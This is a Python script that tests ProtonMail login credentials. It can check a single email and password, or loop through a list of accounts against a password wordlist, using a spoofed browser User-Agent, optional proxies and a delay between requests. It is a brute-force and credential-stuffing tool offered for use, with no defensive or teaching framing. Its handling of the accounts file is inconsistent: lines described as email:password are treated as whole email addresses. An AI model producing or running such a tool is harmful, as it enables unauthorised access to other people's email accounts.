import requests
import time

def check_protonmail(email, password, proxy=None):
    url = "https://mail.protonmail.com/api/v1/accounts/verify"
    data = {
        "Username": email,
        "Password": password
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Referer": "https://mail.protonmail.com/",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json"
    }
    proxies = {
        'http': proxy,
        'https': proxy
    } if proxy else None
    
    with requests.Session() as session:
        response = session.post(url, json=data, headers=headers, proxies=proxies)
    
        if response.status_code == 200:
            return True
        else:
            return False

def load_wordlist(filename):
    with open(filename, "r") as file:
        return [line.strip() for line in file]

def main():
    option = input("Choose an option:\n1. Check a single account\n2. Check multiple accounts\n")
    
    if option == "1":
        email = input("Enter ProtonMail email: ")
        password = input("Enter password: ")
        proxy = input("Enter proxy (optional): ")
        result = check_protonmail(email, password, proxy)
        
        if result:
            print("Valid credentials!")
        else:
            print("Invalid credentials!")
    
    elif option == "2":
        accounts_file = input("Enter the filename containing accounts (format: email:password): ")
        wordlist_filename = input("Enter wordlist filename: ")
        proxy = input("Enter proxy (optional): ")
        delay = float(input("Enter delay between requests (in seconds): "))
        
        accounts = load_wordlist(accounts_file)
        passwords = load_wordlist(wordlist_filename)
        
        for email in accounts:
            for password in passwords:
                result = check_protonmail(email, password, proxy)
                
                if result:
                    print(f"Valid credentials found! Email: {email}, Password: {password}")
                
                time.sleep(delay)
    
    else:
        print("Invalid option!")
    
    print("Finished checking.")

if __name__ == "__main__":
    main()
